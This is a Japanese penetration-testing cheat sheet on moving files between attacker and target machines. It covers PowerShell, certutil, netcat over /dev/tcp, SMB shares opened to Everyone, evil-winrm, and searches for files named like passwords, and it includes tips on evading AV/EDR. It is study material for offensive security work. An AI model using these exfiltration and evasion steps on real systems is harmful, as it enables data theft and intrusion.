## ファイルダウンロード

### 🪟Windows

PowerShellでのファイルのダウンロード(コマンドラインから)
```powershell
Invoke-WebRequest -Uri "http://<IP>/<file>" -OutFile "<filepath>"
```
- **注意** : `-OutFile`にはファイルの名前も含めること。

cmd.exeでcertutilを使用してのファイルのダウンロード
```cmd
certutil.exe -urlcache -split -f http://<IP>/<file> "<filepath>"
```
- `-f` : 同じファイルが存在するときにファイルを上書きする
- `-split`: ファイルを分割してダウンロードすることで、中断時に再開しやすくする
- certutilは証明書管理の正規のツールであるため、多くのAV/EDRで許可されている

>[!TIP]
> 🔗[DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)には、インターネット（または外部サーバ）からプログラムをダウンロードし、そのまま実行するためのpowershellワンライナーが記載されている。
> ディスクに保存せずにメモリ上で直接実行するので、AVやEDRに検知されにくい。

### 🐧Linux

wget
```zsh
wget -O <file> http://<IP>/<file>
wget -O <file> <IP>/<file>
```

curl
```zsh
curl -o <file> http://<IP>/<file>
```

> [!TIP]
> - wgetはデフォルトで`http://`を補完するため、`http://`は削除してもうまくいく 
> 	- → WebShellなどにおいて、URLでペイロードを渡す際、`://`という文字がエンコードしても誤解釈されることがあるため、wgetを使って`http://`を消せば正常に動くことがある

## ファイルの転送

### Python webサーバ

- 送信側（ファイル保持ディレクトリにcdした上で）
```zsh
python -m http.server <Port>
```

- 受信側：[ファイルダウンロード](#ファイルダウンロード)

### Apache webサーバー

Pythonよりも安定していて、大容量のファイル転送に向いている。

1. Kali上でapacheを有効にする（送信側）
```zsh
sudo systemctl start apache2
```

2. Kali上で送信したいファイルをapacheのホームディレクトリに配置
```zsh
sudo cp <file_path> /var/www/html
```

3. Kali上でapache webサーバーへの通信ログを表示しておく
```zsh
tail -f /var/log/apache2/access.log
```

4. 受信側でKaliのapacheサーバーにリクエスト
```powershell
powershell wget -Uri http://<IP>/<file> -OutFile <output_path>
```

### scp

Windows環境から自身の環境（Kali Linux）にファイル転送したい場合によく使う。
インタラクティブなシェルでないと使えない。

1. Kali上でsshサービスを有効にする（受信側）
```zsh
sudo systemctl start ssh
```

2. Windows環境からscpで転送（送信側）
```powershell
# port指定は先頭に-P <port>
scp <file> <ssh_username>@<IP>:<受信側フォルダパス>
```
- `<file>`：Windowsであってもファイル名はフロントスラッシュ(/)で

3. 後始末として、Kali上でsshサービスを無効にする
```zsh
sudo systemctl stop ssh
```

### nc

- Linux → Linux
- HTTPサーバーが使えない、かつ、scpが使えないとき

Attacker Linux
```zsh
nc -lvnp <listener_port> > <file_name>.txt
```

Target Linux
```zsh
# テキストファイルのとき
cat <file> > /dev/tcp/<IP>/<listener_port>

# バイナリファイルのとき
base64 <binaryfile> > <file_name>.txt
cat <file_name>.txt > /dev/tcp/<IP>/<listener_port>
```

### base64

- Linux → Linux
- バイナリデータを転送したいときにつかう
- 次のような**厳しい制約下でも使える**
	- ターゲットでHTTPサーバが使えないとき
	- インタラクティブなシェルでなくscpが使えない
	- FWで通信が抜けられないとき（唯一抜けられるポートはリバースシェルに使っている）

Target Linux
```zsh
base64 <binaryfile> > <file>.txt
cat <file>.txt # 地道にコピー
```

Attacker Linux
```zsh
# コピーした内容を<file>.txtとして保存
base64 -d <file>.txt > <binaryfile>
```

### SMB

Windowsターゲットにおいて、`netstat -ano`でSMBが動作している場合に使用可能。

#### Windows → Linux w/ SMB

Linux
```zsh
mkdir <共有用のディレクトリ>
impacket-smbserver -smb2support -username <username> -password <password> <SMB_share> <共有用のディレクトリへのパス>
```
- すべて任意の値（username、passwordも）

Windows
```cmd
net use \\<LinuxIP>\<SMB_share> /user:<username> <password>
```
- →出力：The command completed successfully.
```powershell
# 単一ファイルのコピー
cp <共有したいファイルへのパス> \\<LinuxIP>\<SMB_share>\

# ディレクトリごとコピーしたい場合は圧縮してからコピー
Compress-Archive -Path <dir_path> -DestinationPath <file.zip>

# 💡ファイルの実行結果をコピー（便利）
.\winPEAS.exe | Tee-Object -FilePath \\<LinuxIP>\<SMB_share>\
```

>[!NOTE]
>SMB接続を遮断した後、別のセッションでSMB接続を確立させたいとき、前のセッションが残っていて新しく接続できない時は、接続を遮断すること
```powershell
net use \\<LinuxIP>\<SMB_share> /delete
```

#### Linux → Windows w/ SMB

Windows
```powershell
# フォルダ作成
New-Item -ItemType Directory -Path '<任意のディレクトリ名>'

# フォルダを共有
New-SmbShare -Name '<任意のSMB共有名>' -Path '<任意のディレクトリ名>' -FullAccess 'Everyone'
```

Linux
```zsh
# ドメイン環境の場合は-W <domain>を追加
smbclient //<WindowsIP>/<任意のSMB共有名> -U '<username>' -c 'put <ファイル>'
```

#### Windows → Windows w/ SMB

- 使用シチュエーション：
	- Kali - Windows A - Windows Bという構成のときで、Windows Bのファイルを直接Kaliに送れないとき
	- かつ、evil-winrmでログインしていないとき
	- かつ、scpが使えるインタラクティブなシェルではないとき

Windows A（要システム権限）
```powershell
# フォルダの作成
mkdir C:\PublicShare

# 共有の設定（Everyoneにフルコントロールを付与）
net share Transfer=C:\PublicShare /grant:Everyone,FULL

# フォルダ自体の権限をEveryoneフルコントロールに
icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
```

Windows B
```powershell
# Windows BからWindows Aへファイルをコピー
copy <file_path> \\<WindowsA_IP>\Transfer\
```
- あとはWindows AにコピーされたファイルをKaliに転送する

### evil-winrm

✅Tunnelingしているときに非常に便利
❌遅い

Linuxのカレントディレクトリからアップロードもしくはダウンロードできる
```powershell
# winrm接続先のディレクトリにアップロード
*Evil-WinRM* PS C:\Users\TEMP> upload <file>

# winrm接続元のディレクトリにダウンロード
*Evil-WinRM* PS C:\Users\TEMP> download <file>
```

### certutil

✅ Non-interactive shellでも使える
✅ シンプル・高速
✅ Windows標準コマンド（LOTL）
❌ ダウンロードのみ（アップロード不可）

```powershell
certutil -urlcache -split -f "http://LinuxIP>/<file>" <file>
```

### トラブルシューティング

- Webサーバー側でBroken Pipeエラー：
	- ファイルサイズが大きいため、certutil、Apache webサーバー、smbを使う
	- 書き込み先にwrite権限があるかを確認する

## ファイルの検索

Linux
```zsh
# ディレクトリの検索は-type dとなる
find / -name "<検索キーワード(ワイルドカード使用可)>" -type f 2>/dev/null
```

Windows PowerShell
```powershell
# 具体例：Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <path> -Include <検索キーワード（ワイルドカード使用可）> -File -Recurse -ErrorAction SilentlyContinue
```

Windows Command Prompt
```cmd
dir C:\<検索キーワード(ワイルドカード使用可)> /S /B 2>nul
```
- `/S`：サブディレクトリも検索
- `/B`：ベアモード（ファイル名のみ表示し、サイズなどは表示しない）
- 例：`dir C:\*password* /S /B 2>nul`

## ファイルの可読性向上

### JSON

- pretty print
```zsh
python -m json.tool < <JSONファイル> | tee output.json
```

#### 特定の値で絞る（jq）

基本文法
```zsh
# 具体例：cat result.json | jq '.result[]' | select(.length == 100) | .url
cat <JSONファイル> | jq '.ルートキー[] | select(条件式) | 抽出キー'
```

JSONの構造
```json
{
  "ルートキー": [
    {
      "抽出キー": 抽出バリュー,
      "url": "http://<IP>"
    }
  ]
}

```
- jqの理解：🔗[とほほのjq入門](https://www.tohoho-web.com/ex/jq.html#about)
